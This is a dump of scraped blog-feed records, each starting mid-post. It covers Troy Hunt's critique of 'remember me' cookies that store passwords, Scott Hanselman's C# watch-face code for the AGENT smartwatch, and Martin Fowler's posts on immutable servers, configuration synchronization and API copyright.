cryptographic… hang on – that’s Base64 encoding! The thing about Base64 encoding is that it’s neatly complemented by Base64<em>de</em>coding which means that you can head off to somewhere like<a href=\"http://www.base64decode.org\">base64decode.org</a>and do this:</p><p><img width=\"514\" height=\"313\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Base 64 decoding the Black& Decker cookie\" src=\"http://lh3.ggpht.com/-aQZzH2NHr6c/UdFGASLoJQI/AAAAAAAAFcE/bxNThlU8CnQ/image8.png?imgmax=800\" border=\"0\"></p><p>Now not everyone uses Base64 as a means of “cryptography” (yes,<a href=\"http://www.troyhunt.com/2013/01/the-problem-with-website-security-is-us.html\">some people do genuinely do this</a>) and indeed it’s a perfectly legitimate means of representing data in an ASCII format, the real story here however is that this is my password sitting there in my browser in plain text. You may wonder – why is this a problem? It’s in your own browser, right? How does an attacker get it?</p><p>I’m going to talk about two very easy ways and the first relates to the earlier link about insecurity being easy. Black& Decker had exposed ELMAH logs and in those logs was every unhandled internal server exception, somewhere north of 50,000 of them at the time I reported it to them. When ELMAH logs an exception it also logs all the request headers which means the<em>cookies</em>are logged. Combine that with the huge number of unhandled exceptions being thrown by the system and now you have a treasure trove of user credentials. Yes, they should have secured their ELMAH log properly to begin with but it’s a good example of how you can be very easily undone by one very simple misconfiguration.</p><p>Here’s another one:</p><p><img width=\"250\" height=\"378\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to Aussie Farmers Direct\" src=\"http://lh3.ggpht.com/-0MQkqGmrVW8/UdFGBK_Z0QI/AAAAAAAAFcM/7HqbqOyYEEM/image311.png?imgmax=800\" border=\"0\"></p><p>This is<a href=\"https://orders.aussiefarmers.com.au\">Aussie Farmers Direct</a>and it’s a fairly typical looking log in form. Let’s log in, tell it to “remember me” then take a look at the cookies:</p><p><img width=\"796\" height=\"139\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Aussie Farmers Direct cookies\" src=\"http://lh5.ggpht.com/-5OyfmaliDfc/UdFGB70cl0I/AAAAAAAAFcU/kFUtgoBKXrk/image91.png?imgmax=800\" border=\"0\"></p><p>Oh dear, same deal again but without any Base64 encoding. Actually this one is particularly bad because you can do stuff like this:</p><p><img width=\"476\" height=\"37\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Improperly encoded cookie on Aussie Farmers Direct\" src=\"http://lh5.ggpht.com/-HMSOuv66vcg/UdFGCsHlkYI/AAAAAAAAFcc/0emkrm4pDqQ/image18.png?imgmax=800\" border=\"0\"></p><p>XSS your own JSON cookie? Sure! The other idiosyncrasy is that changing your password doesn’t change the cookie so you come back to the site later on and it tries to log you in with the old one. Oops.</p><p>Aussie Farmers Direct doesn’t have exposed ELMAH logs (being PHP kind of helps with that!) but they do have other risks such as XSS (incidentally, this has been responsibly disclosed and the risk summarily dismissed – multiple times). The other thing about both the sites above is that those cookies holding the passwords aren’t flagged as HttpOnly, you can see this in the second column from the right in the cookie lists. What this means is that client script can access those cookies which means that if you can get a piece of XSS onto the site – just as you can on the Aussie Farmers site – you can steal cookies containing passwords if you can get a customer to load the XSS payload (and there are numerous ways of doing that). The missing HttpOnly attribute is sloppy on behalf of both sites, but the core of the issue is storing passwords in cookies which then makes them vulnerable via other oversights.</p><p>There’s one more fundamentally important reason why both these practices are negligent; they’re protecting customers’ credentials used on other sites. Every time a customer using the “remember me” feature on one of the sites above makes a request, there’s a very good chance they’re sending the username and password to their email, their eBay or their bank across the wire, sometimes in plain text, sometimes accessible via client script, always sitting there unprotected in the browser.<a href=\"http://www.troyhunt.com/2012/07/what-do-sony-and-yahoo-have-in-common.html\">Password reuse is rampant</a>and whilst those damn users should take some bloody responsibility (I’m paraphrasing here!), we – as developers –<em>must</em>acknowledge that we’re protecting far more than just our own site when we handle credentials.</p><p>So that should establish that there is a genuine misunderstanding of how the “remember me” feature<em>should</em>be built, let’s now move onto the good practices.</p><h4>A sample reference implementation</h4><p>One of the mantras you frequently hear in the security world is “Don’t roll your own – use what’s already been proven to be robust”. This is very frequently applied to encryption and authentication schemes but in this case we can extend this to the “remember me” feature in order to start with a good reference implementation before we delve into the details.</p><p>In a new ASP.NET MVC 4 website provisioned with Visual Studio 2012 you get this right out of the box:</p><p><img width=\"352\" height=\"338\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to a sample ASP.NET application\" src=\"http://lh3.ggpht.com/-T6wJXCWtnpQ/UdFGDJgd8iI/AAAAAAAAFck/vaA2S0PkYic/image31%25255B1%25255D.png?imgmax=800\" border=\"0\"></p><p>Other frameworks have other standard modes of implementing this feature but this is an easy one for me to refer to. When we login with the fields as above (i.e. not asking it to remember me), successful authentication results in the following cookie being returned:</p><pre>Set-Cookie:.ASPXAUTH=6891A5EAF17A9C35B51C4ED3C473FBA294187C97B758880F9A56E3D335E2F020B86A85E1D0074BDAB2E1C9DBE590AF67895C0F989BA137E292035A3093A702DEC9D0D8089E1D007089F75A77D1B2A79CAA800E8F62D3D807CBB86779DB52F012; path=/; HttpOnly</pre><p>This is simply an auth cookie and in the stateless world that is HTTP it’s the one little piece of data that ties all the otherwise entirely independent requests from one person together. Each time this unique-to-me cookie is sent, the website knows it’s me and that I’ve already authenticated. We can see it bit more clearly when we look at it in Chrome’s Cookies collection:</p><p><img width=\"794\" height=\"56\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Cookies from a sample ASP.NET application without the\"remember me\" box checked\" src=\"http://lh3.ggpht.com/-8rKwUf_wQtk/UdFGDifnEmI/AAAAAAAAFcs/HrHn4wNix-s/image6.png?imgmax=800\" border=\"0\"></p><p>Incidentally, the second cookie is an anti-forgery token to prevent CSRF attacks and has nothing to do with our authenticated state.

Let’s take a closer look at that.</p><h4>Looking at auth cookie expiration</h4><p>This is actually a ridiculously easy security construct and it’s only in light of the earlier examples that I’d even think it worth writing about, but here we are. In this implementation, the “remember me” feature simply boils down to when the auth cookie expires because what you’re really doing here is controlling how long you want someone to stay logged on for, it’s that simple.</p><p>In the example above, ASP.NET defaults to using a session cookie or in other words, a cookie that does not have an explicit expiration date and will therefore forcibly expire when the browser is closed. That’s one approach, another is to explicitly set a short expiration period so that even if the browser is left open the user will be automatically logged out after a period of time. Of course you can also control this behaviour on the server and you can also keep extending the lifetime of an auth cookie if the system is being actively used by the server increasing the expiration date on response.</p><p>Remembering someone can be as simple as keeping that auth cookie alive. How long should it be kept alive for? The example above defaults to two days which is probably a bit short for many legitimate uses of the feature (although it’s easily configurable in ASP.NET), try Facebook though and you’ll get cookies that last for a year. Shorter duration means less risk but more inconvenience, longer duration makes it easier for the user but increases the window of potential attack. Let’s take a look at that risk in more detail.</p><h4>Exploiting long-running authentication state</h4><p>While you are not authenticated, your session can’t be hijacked. I know, insightful stuff! But seriously, take a case like Aussie Farmers Direct above; that cookie will expire in six months and combined with the fact that it’s not flagged as HTTP only and that they have XSS flaws in the site there’s now half a year window where just following a link could cause me to inadvertently hand over my credentials to an attacker. If that period was, say, one month yes, they’d still have some serious flaws in their design but then the window of opportunity for an attacker has just been slashed.</p><p>On the other hand, Black& Decker has a relative short one week expiration period so in their case with the exposed ELMAH logs, yes, there was a series of bad failures on their part but unless someone had logged in with the “remember me” box ticked in the last week<em>and</em>caused an unhandled exception, the credentials wouldn’t be put on public display. Ok, if you’re on the site to begin with there’s a good chance you’re already logged in (at least compared to the Farmers example where you wouldn’t have to consciously go anywhere near the site to lose your password) but you can see how that risk profile changes with the cookie expiration period.</p><p>Of course underlying all this is that the auth cookie needs to be carefully protected; HttpOnly and secure attributes are an absolute must. All your classic hijacking threats remain relevant but then again, however you slice and dice this feature you’re going to end up with a cookie dependency therefore you’re going to need to watch those cookies very, very carefully.</p><p>Ultimately it’s a trade-off that needs to consider factors such as the value to an attacker of the user’s data on the site, the barrier that<em>not</em>being authenticated poses to a returning user and the security profile of the rest of the site. For example, Facebook has some very useful data of a social nature and users expect a low-friction (even<em>no</em>-friction) process when returning, plus they’ve made<em>massive</em>investments in their security profile. Aussie Farmer’s, on the other hand, holds personally identifiable user data plus financial info whilst providing a service that people<em>expect</em>to authenticate to (payment facilities) yet have little understanding of important security concepts. They’re very different risk profiles and they<em>should</em>be very different auth cookie expiration strategies.</p><h4>Strengthening the approach</h4><p>There will be folks who look at the auth cookie approach and roll their eyes in despair. The thing about security is that there’s always a better way depending on the time / money / complexity you’re willing to add and there’s also always someone ready to tell you you’ve got it wrong! Using the auth cookie expiration as a starting point, let’s look at some possible ways of strengthening the approach.</p><p>One argument against long expiration of auth cookies is that they’re effectively keeping the user authenticated and at risk of attacks such as CSRF or clickjacking. Of course the application needs to exhibit other risks in order for an attacker to capitalise on the long lasting cookie but the whole defence in depth argument comes up again. An alternative is to have a dedicated cookie keyed against the user which after validating the authenticity of it with the server, can then initiate a new authenticated session on their return. The original session can then expire quickly, the trick is to re-instate a new one when the user comes back with the dedicated “remember me” cookie and include some additional validation in the process.</p><p>One way of providing additional validation is by including the user’s IP address / user agent / other distinguishing feature in the “remember me” cookie. The rationale is that this offers some defence against hijacking of the cookie. The problem, of course, is that there are legitimate use cases where these change. In the mobile world in particular it’s not uncommon to return to a site with a different IP. Even in the world of physical connections you can’t necessarily rely on the ISP providing a static IP address. As for user agents, with browsers like Chrome and Firefox updating at what seems like every other day, unless you’re a bit selective about<em>what</em>attributes of the user agent string you’re storing and comparing that’s going to be a risky approach. The same defences around using unique user attributes to and add security are often discussed in the context of session and auth cookies and whilst I’m sure there are valid use cases for this (back to banking again), I can’t say I’ve actually seen it in place in any of the sites I’ve tested before. There’s probably a good reason for that…</p><p>A more pragmatic mitigation is to still separate the auth cookie from a dedicated “remember me” cookie and use the latter to re-authenticate the user<em>but impose some restrictions</em>. The reality is that the process of automatically persisting someone’s authenticated state – through whatever means – introduces compromises to the security model. A mitigation would be to require an automatically re-authenticated user to expressly provide their credentials again before viewing certain classes of data or performing certain activities. This is not unheard of even outside the scope of “remember me”, you might see it when performing high-value activities such as a bank transfer. In this case, we’re saying that the authenticated user is at greater risk because there’s more likelihood that they’re not who they say they are (i.e. someone else has sat down at the PC and effectively highjacked a session).</p><p>The other hardening we can apply to this approach is to ensure that the cookie used to remember the user is reset after it has been used. This also means invalidating it on the server side so there needs to be both uniqueness and persistence of the cookie value, for example a nonce persisted in both the database and the cookie. This has the benefit of ensuring that if the cookie<em>is</em>obtained by an attacker it has only has a single use scope – and that’s if the user can’t legitimately use it before them. There’s a good little article<a href=\"http://jaspan.com/improved_persistent_login_cookie_best_practice\">here</a>which talks about some mitigations to this pattern and again, there are use cases where this can be beneficial but you are going to invest additional effort building it and there are cases where it will inconvenience legitimate users (i.e. trying to remember yourself on the same site across multiple PCs).</p><p>The last thing worth mentioning is that the same account management principles that need to be considered for active authenticated sessions are relevant in the “remember me” context. For example, are multiple simultaneously authenticated sessions allowed from the one user? If the user changes their password will it disconnect the other sessions? Can an administrator end the authenticated session? There are all sorts of issues that come up that are<em>really</em>part of the discussion on how authenticated sessions are verified and managed, the discussion here is merely about how to reinstate that.</p><h4>When shouldn’t you allow “remember me”? (and some middle-ground alternatives)</h4><p>Sometimes it simply<em>never</em>makes sense to allow an authenticated user to remain authenticated for long periods of time. Banking, for example, is the stereotypical use case for when you want to force re-authentication as soon as possible as the risks are just too significant to leave unused authenticated browser sessions lying around the place.</p><p>But there is actually some middle ground that can be taken here:</p><p><img width=\"240\" height=\"278\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"A\"remember me\" box on the American Express website\" src=\"http://lh4.ggpht.com/-utZn1CP4eZM/UdFGEmoMc9I/AAAAAAAAFc8/Lh20wkoe09Y/image12.png?imgmax=800\" border=\"0\"></p><p>This is not entirely what it looks like – when you come back after an expired session where you asked the site to “Remember Me”, you’ll get this:</p><p><img width=\"241\" height=\"280\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"The American Express website pre-populating the username on return\" src=\"http://lh6.ggpht.com/-4s1S1UF2cYQ/UdFGFMBkHXI/AAAAAAAAFdE/4NdTjBkR_rM/image15.png?imgmax=800\" border=\"0\"></p><p>I’ve not obfuscated the username, the username as it appears above with the stars are stored in a cookie that lasts for three months along with some other data that inevitably identifies the user. Frankly, I don’t see a lot of value in this, remembering your username isn’t usually the problem!</p><p>But it also doesn’t have to be all or nothing, there’s middle ground. For example, the point I made earlier about re-authenticating before key processes are performed if the session had been resumed by a “remember me” feature. It’s a bit of the best of both worlds.</p><h4>In conclusion…</h4><p>This is one of those features that seems like a good idea at the time (and<em>sometimes</em>it is) and it’s usually very easy to get right, at least<em>sufficiently</em>right for most purposes. Frankly, it’s still a little baffling how wrong the two earlier examples got it particularly when you consider that it would have been sufficient to just extend the lifetime of the cookie they already have!</p><p>The other point to take away from this post beyond just the mechanics of the “remember me” feature is how security is such a multi-tiered, inter-dependent beast. You might be able to get away with credentials in cookies by themselves, but combine that with the ELMAH situation or missing HTTP only attributes and XSS flaws and suddenly a foolish albeit relatively innocuous practice becomes a serious risk. What was that about “defence in depth” again?!</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/8M6Zs6dCWn8\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1161}}

I loaded up VS2012 and the binary clock emulator. This initial code is just about 100 lines. You can see the references in Solution Explorer here. SPOT means\"Smart Personal Object Technlogy.\"</p><p>The fact that there is an emulator is huge. No worries about breaking a watch or even having a watch! The Agent Watch SDK puts a reference to the AGENT Emulator in my registry, so it shows up directly in Visual Studio:</p><p><img title=\"image\"style=\"display: inline\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_8.png\"width=\"319\"height=\"217\"/></p><p>Then I can debug my watch app without a watch, just as if I were writing a Phone App or Web Site. It's a first class experience inside of VS. This makes me feel particularly empowered as a .NET developer because it means<em>I already know how to write apps for this watch</em>and I've never even seen it before..</p><p><img src=\"http://hanselman.com/blog/content/binary/agentsmartwatchanimation.gif\"/></p><p>The code is pretty straightforward, if appropriately low-level. This IS a small device we're talking about!</p><p>You've got total control over the screen and what can be displayed. You could create any watch face that you could imagine (that would fit on the screen) because you have a Bitmap to draw to.</p><p>The .NET Micro Framework has no fonts<em>loaded</em>by default, but I can include them as resources. There's some\"<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~msdn.microsoft.com/en-us/library/cc533019.aspx\">tinyfnt</a>\" files in C:\\Program Files (x86)\\Microsoft .NET Micro Framework\\v4.3\\Fonts or I could download or make some myself. Even better I can<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~informatix.miloush.net/microframework/Utilities/TinyFontTool.aspx\">use the TinyFontTool from Miloush</a>.</p><p>I can load a font from a resource like this:</p><pre class=\"brush: csharp; toolbar: false; auto-links: false;\">font = Resources.GetFont(Resources.FontResources.small);</pre><p>and then later in my UpdateTime() method, Draw the time on my binary clock screen.</p><pre class=\"brush: csharp; toolbar: false; auto-links: false;\">_bitmap.DrawText(DateTime.Now.ToString(\"HH:mm:ss\"), font, Color.White, 45, 15);</pre><p>Run my emulator again and I have the time printed as well!</p><p><img title=\"Now my AGENT Smart Watch has the time printed above the Binary Clock\"style=\"display: inline\"alt=\"Now my AGENT Smart Watch has the time printed above the Binary Clock\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_11.png\"width=\"315\"height=\"438\"/></p><p>The only real\"microframework-ism\" in the code is that the watch face doesn't want to use a lot of power, so you should\"go to sleep.\" It's the same as if you were writing a console app. If your main() function ends, then your app will end! But, since this is a watch face, we want it to run all the time, so, we start a 1 second timer, then sleep the main() forever. Everything interesting happens as an event on a background thread. (The watch can control the lifetime and tombstone or kill the watch face if you're doing other things.)</p><pre class=\"brush: csharp; toolbar: false; auto-links: false;\">public static void Main()<br>{<br>_bitmap = new Bitmap(Bitmap.MaxWidth, Bitmap.MaxHeight);<br>_font = Resources.GetFont(Resources.FontResources.small);<br><br>// display the time immediately<br>UpdateTime(null);<br><br>// set up timer to refresh time every minute<br>DateTime currentTime = DateTime.Now;<br>TimeSpan dueTime = new TimeSpan(0); // beginning of next minute<br>TimeSpan period = new TimeSpan(0, 0, 0, 1, 0); // update time every minute<br>_updateClockTimer = new Timer(UpdateTime, null, dueTime, period); // start our minute timer<br><br>_button = new InterruptPort(HardwareProvider.HwProvider.GetButtonPins(Button.VK_SELECT),<br>false,<br>Port.ResistorMode.PullDown,<br>Port.InterruptMode.InterruptEdgeBoth);<br>_button.OnInterrupt += _button_OnInterrupt;<br>// go to sleep; time updates will happen automatically every minute<br>Thread.Sleep(Timeout.Infinite);<br>}</pre><p>That last part is interesting. You've got two event handlers here, the one to UpdateTime every second and then one to watch for the Button getting pressed. You want the watch app to be event-driven...it needs to do as<strike>little as possible</strike>NOTHING until it's time to do something. This InterruptPort is watching for the the middle button (the VK_SELECT button). ResisterMode.PullDown means the button will show\"1\" or<em>true</em>when it's pressed. InterruptEdgeBoth means I get events when the button is pressed AND when it goes up.</p><h3>Go make Watch Apps!</h3><p>Here's another cool watch face from<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://www.facebook.com/media/set/?set=vb.239788096166290&type=2\">Dylan Mazurek</a>next to the Big Digits example:</p><p><img title=\"PixelFace example Watch for AGENT Smart Watch\"style=\"display: inline\"alt=\"PixelFace example Watch for AGENT Smart Watch\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_14.png\"width=\"315\"height=\"438\"/> <img title=\"BigDigits example Watch for AGENT Smart Watch\"style=\"display: inline\"alt=\"BigDigits example Watch for AGENT Smart Watch\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_17.png\"width=\"315\"height=\"438\"/></p><p>And finally, here's an animated concept for a World Time face that<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://twitter.com/Gutworks\">Steve Bulgin</a>made for Pete Brown as well as another<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://twitter.com/Gutworks\">Steve</a>concept below:</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://twitter.com/Gutworks\"><img src=\"http://hanselman.com/blog/content/binary/agentsmartwatchworldwatchface.gif\"/></a></p><p>The next step will be more than watch faces, it will be watch utilities and apps.

with abstraction and (preferably) dependency injection.<blockquote><p>On at least 2 occasions recently, I have heard speakers tell their audience that you cannot reference a target-specific .NET library (such as a .NET Framework 4.5 library) from a Portable Class Library. While this is technically true, it doesn't tell nearly the whole story. Even though we can't reference target-specific libraries, we can still USE these libraries. We can call their methods and access their properties under the right circumstances. We can gain access to these libraries via an abstraction. My preferred method of doing this is...Dependency Injection.</p></blockquote><h3>Cross Platform .NET Coolness</h3><p>There's lots of great examples of code reuse,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselminutes.com/343/draw-a-stickman-epic-an-iphone-android-and-windows-8-game-with-monogame\">like the podcast I did with the folks who wrote\"Draw a Stickman EPIC.\"</a>This app has 95%+ code reuse, all written in C# and is available in every App Store there is.

Such tools can create<a href=\"http://martinfowler.com/bliki/PhoenixServer.html\">PhoenixServers</a>that can be torn down and rebuilt at will. An Immutable Server is thelogical conclusion of this approach, a server that once deployed, isnever modified, merely replaced with a new updated instance.</p><p>Automated configuration tools are usually used with<a href=\"http://martinfowler.com/bliki/ConfigurationSynchronization.html\">ConfigurationSynchronization</a>where you leave a serverrunning for a potentially long period of time, repeatedly applyingconfiguration to bring it into line with the latest specification.In theory servers can be allowed to run indefinitely, and they'll bekept completely consistent and up to date. In practice it's notpossible to manage a server's configuration completely, so there isconsiderable scope for configuration drift, and unexpected changesto running servers.</p><p>This is where a<a href=\"http://martinfowler.com/bliki/PhoenixServer.html\">PhoenixServer</a>is helpful.</p><img src=\"http://martinfowler.com/bliki/images/immutableServer/PhoenixServerLifecycle.png\" title=\"Lifecycle of a Phoenix Server\"/><p>By frequently destroying and rebuilding servers from the baseimage, 100% of the server's elements are reset to a known state,without spending a ridiculous amount of time specifying andmaintaining detailed configuration specifications.</p><p>Once you're using phoenixes, the focus ofconfiguration management shifts to the management of base images.Fixes, changes, and updates are applied to the base image ratherthan to running systems. Each time you want a new update you modifythe base instance and run it through an automated test harness. You onlycreate new servers when they pass these steps.</p><p>So a phoenix server's complete state is built from a combinationof base image + automated configuration management + data<a href=\"#footnote-data\">[1]</a>, which reduces the pressure to have automatedconfiguration manage 100% of the server.</p><p>But while we can continue to run configuration management updateson a server during its brief lifetime, there's less value in doingso. In fact, there is considerable value in<i>not</i>doing so, sinceany change to a running system introduces risk.</p><p>This leads naturally to immutable servers<a href=\"#footnote-coin\">[2]</a>.</p><img src=\"http://martinfowler.com/bliki/images/immutableServer/ImmutableServerLifecycle.png\" title=\"Lifecycle of an Immutable Server\"/><p>Once you've spun up a server instance from a well-tested base image, youshouldn't run configuration management tools, since they createopportunities for untested changes to the instance. Any changes thatare needed can be made to the base image, tested, and then rolledout. Servers without the change are torn down and replaced.</p><p>If this sounds familiar, it's because it follows the practices of<a href=\"/articles/continuousIntegration.html\">ContinuousIntegration</a>and<a href=\"http://martinfowler.com/bliki/ContinuousDelivery.html\">ContinuousDelivery</a>. WithContinuous Delivery of software, it's safer to compile a given version ofan application into a deployable artifact only once, and know that you aredeploying and running a consistently built application in all environments.With an immutable server, you make each change to a base image, and thenyou know that all instances created from that image are consistent.</p><p>The main differences between instances of a server role come fromconfiguration settings, which should come from outside the server.For example, most virtualization and cloud platforms offer a way toset metadata values when provisioning a new instance, which can thenbe read by the running server. New servers may also pullconfiguration values from a central registry like<a href=\"http://zookeeper.apache.org/\">Zookeeper</a>.</p><p>It's advisable to minimize the number and scope of per-instanceconfiguration items for immutable servers, and to run changes tothese through automated testing where feasible.</p><hr class=\"topSection\"/><h2 id=\"HandlingData\">Handling data</h2><p>If servers are disposable, the data that lives on them often is not.When implementing phoenix or immutable servers you should consider whatdata needs to be persisted as servers are destroyed and created, and whatdata must be replicated in order to scale by adding additional servers.</p><p>You can ship data off of the instance when it has value but isn't neededat runtime, for example sending logfiles to a central syslog server. A sharedfile system like NFS can make files available to servers, perhaps living ona SAN. Cloud platforms generally offer mountable storage devices like AWSEBS volumes which can be attached to new servers instances when the old onesare destroyed, or quickly duplicated and attached to replicas when scaling acluster. Often you can pass the buck to a service which someone else maintains,like Amazon's RDS database service.</p><div class=\"furtherReading\"><h2>Further Reading</h2><p>Netflix has been at the forefront in using the ImmutableServerpattern, although I'm not aware that they've used the term.

If some configuration change is needed, it's made in theconfiguration specification (recipes, manifests, or whatever the particularconfiguration tool calls it), and is then applied to all relevantservers across the infrastructure.</p><img src=\"http://martinfowler.com/bliki/images/configurationSync/ConfigurationSynchronizationPattern.png\" title=\"Configuration is synchronized to the server repeatedly during its lifetime\"/><p>In theory, once a server has been created, configurationsynchronization will keep it up to date, applying upgrades andpatches and preventing<a href=\"http://kief.com/configuration-drift.html\">configuration drift</a>for a potentially longlifetime.</p><p>In practice, however, it isn't feasible to keep serverscompletely consistent using current automated configurationmanagement tools, so over time configuration synchronizationleads to inconsistency.<a href=\"#footnote-vendor\">[1]</a></p><p>Each element of server configuration managed by an automated toolrequires work to write, test, and maintain the recipe or manifest.It simply isn't reasonable to attempt to manage every single elementof a typical server using these tools. There are far too many ofthem. And for each additional element you do specify, thework involved grows non-linearly thanks to the potentialinteractions, integrations, and dependencies between them.</p><p>Software packages are a particular challenge, given thedependencies they may have on yet more packages. Tools such asyum, apt-get, gems, etc. automatically work out dependencies andinstall them from repositories. So a large number of the packageson a system are only implicitly managed, and may change withoutnotice. Although you can micro-manage the versions and dependenciesof software packages installed, it's an intractable job consideringthe number of packages involved.</p><p>If managing the stuff you want to have on your server isdifficult, managing the things you don't want is worse, given thereare an effectively inifinite number of them. Current configurationmanagement tools require you to explicitly list each file, package,or other element you want removed if found. This means additionalthings can be manually added onto some servers, creating inconsistentand unexpected behaviour.</p><img src=\"http://martinfowler.com/bliki/images/configurationSync/ConfigurationSynchronization_UnmanagedChanges.png\" title=\"Changes left unmanaged by ConfigurationSynchronization\"/><p>In reality, people using automated configuration tools get bywell enough without specifying 100% of the configurable surface areaof their servers. Teams apply the 80/20 rule to automated configuration,focusing 80% (or more like 95%) of their attention on defining that20% (or 5%) of the system which is most relevant to their particularneeds, leaving the rest to the defaults installed by the base OS. Sothe majority of the system is not under automated configuration, andgenerally, this works. Unfortuantely, when it doesn't - when somepart of the system not managed by automation tools does cause an issue,the effects are unexpected and can be difficult to track down.</p><p>This problem grows worse over the lifespan of a server,and with the frequency of change. The longer a server stays up, themore it may deviate from other servers, especially newer ones.</p><p>This issue leads some people to use<a href=\"http://martinfowler.com/bliki/PhoenixServer.html\">PhoenixServers</a>. Byensuring that a server's lifespan is kept short, frequentlyrebuilding fresh ones from a base image, the potential forconfiguration drift is kept small, without the overhead ofspecifying more of the server's configuration in a management toolthan is really necessary. Taking the phoenix server to its logicalconclusion leads to<a href=\"http://martinfowler.com/bliki/ImmutableServer.html\">ImmutableServers</a>, whichavoid any changes made to a server during it's lifespan.</p><div class=\"footnote-list\"><h2>Notes</h2><div class=\"footnote-list-item\" id=\"footnote-vendor\"><h3 class=\"head-text\">1: Vendor Aspirations</h3><p>My colleague Max Lincoln provided these references toconfiguration tool vendors' aspirations around total systemconfiguration:</p><ul><li>\"Create a blueprint of your infrastructure - so it can be builtor rebuilt consistently from scratch in minutes\" -<a href=\"http://www.opscode.com/solutions/configuration-management/\">OpscodeChef</a></li><li>\"Eliminate configuration drift and reduce outages\" -<a href=\"https://puppetlabs.com/solutions/configuration-management/\">Puppetlabs</a></li><li>\"CFEngine then continuously corrects configuration drift,keeping systems in compliance with their Desired State.\" -<a href=\"http://cfengine.com/what-is-cfengine\">CFEngine</a></li></ul></div></div>","author":false,"_id":{"$wrap":"$oid","v":1186}}

The brief isa statement on behalf programmers who oppose the copyrighting ofAPIs. I'm one of the signatories to the amicus brief.</p><p>The software industry has long had a complicated relationship withintellectual property law. It's long been held that source code canbe protected by copyright, preventing someone from just copyingsomeone else's program without their consent. On the whole I'm infavor of using copyright in this way - as one who writes a lot ofprose describing software development, the mechanism seems to fitwell.</p><p>But that fit breaks down when it comes to interfaces of softwarecomponents. The whole point of components, as I see it, is that theyrepresent software elements that are independently replaceable andupgradeable<a href=\"#footnote-component\">[1]</a>. Breaking down softwaresystems into components allows competition to develop, as differentgroups compete with better or cheaper components. For this to work,components need to have common interfaces, which raises the questionof how such interfaces can develop.</p><p>So far common interfaces mostly appear by interfaces becomingwidely used and then widely copied. This can be intentionally, withcomponent authors documenting their interfaces, orby reverse engineering of closed interfaces. Reverse engineering ofclosed interfaces has played a vital role in the development ofsoftware systems we use today - the amicus brief describes examplessuch as various elements of Unix, the BIOS of the IBM PC, and theSMB protocol for network sharing of hard drives.</p><p>This background was challenged recently<a href=\"http://en.wikipedia.org/wiki/Oracle_v._Google\">by a case</a>brought by Oracle against Google's use of Java for Android. Thereare<a href=\"http://arstechnica.com/series/series-oracle-v-google/\">a number ofparts to this case</a>, but a key question was whether the API tocore java libraries was copyrightable. Last year a<a href=\"http://arstechnica.com/tech-policy/2012/05/google-wins-crucial-api-ruling-oracles-case-decimated/\">federaldistrict court ruled</a>that APIs were not copyrightable. Oracle isappealing against this, the amicus brief that we signed wasorganized by the EFF to uphold the district court's ruling.</p><p>I am not opposed to intellectual property in general, or the useof copyright for software. I do think it's reasonable for softwaredevelopers to be able to protect their hard work through the courseof an admittedly imperfect legal system. Nor do I deny thatdesigning a good API is significant intellectual work. But likeeverything else in property law, it's about balancing interests.Copyrightable APIs would erect considerable barriers to innovationand competition, further limiting the ability of new entrants todisrupt markets and improve the software ecosystem. This threat isnot a small one, and I'm happy to play a small part in opposingit.</p><div class=\"footnote-list\"><h2>Notes</h2><div class=\"footnote-list-item\" id=\"footnote-component\"><p><span class=\"num\">1:</span>I took this definition from Ralph Johnson</p></div></div>","author":false,"_id":{"$wrap":"$oid","v":1187}}

